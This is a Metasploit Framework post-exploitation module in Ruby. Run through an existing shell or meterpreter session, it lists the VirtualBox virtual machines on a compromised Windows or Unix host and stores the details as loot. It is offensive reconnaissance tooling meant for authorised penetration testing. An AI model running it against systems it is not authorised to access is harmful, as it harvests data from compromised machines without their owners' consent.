##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'
require 'msf/core/post/file'
require 'yaml'

class Metasploit3 < Msf::Post

	include Msf::Post::File


	def initialize(info={})
		super( update_info(info,
			'Name'           => 'Multi Gather VirtualBox VM Enumeration',
			'Description'    => %q{
								This module will attempt to enumerate any VirtualBox VMs on the target machine.
								Due to the nature of VirtualBox, this module can only enumerate VMs registered
								for the current user, thereforce, this module needs to be invoked from a user context.
								},
			'License'        => MSF_LICENSE,
			'Author'         => ['theLightCosine'],
			'Platform'       => ['unix', 'bsd', 'linux', 'osx', 'win'],
			'SessionTypes'   => ['shell', 'meterpreter' ]
		))
	end

	def run
		if session.platform =~ /win/
			res = session.shell_command_token_win32('"c:\Program Files\Oracle\VirtualBox\vboxmanage" list -l vms') || ''
			if res.include? "The system cannot find the path specified"
				print_error "VirtualBox does not appear to be installed on this machine"
				return nil
			elsif res == "\n"
				print_status "VirtualBox is installed but this user has no VMs registered. Try another user."
				return nil
			end
		elsif session.platform =~ /unix|linux|bsd|osx/
			res = session.shell_command('vboxmanage list -l vms')
			unless res.start_with? "Sun VirtualBox"
				print_error "VirtualBox does not appear to be installed on this machine"
				return nil
			end
			unless res.include? "Name:"
				print_status "VirtualBox is installed but this user has no VMs registered. Try another user."
				return nil
			end
		end
		print_good res
		store_loot('virtualbox_vms', "text/plain", session, res, "virtualbox_vms.txt", "Virtualbox Virtual Machines")
	end


end
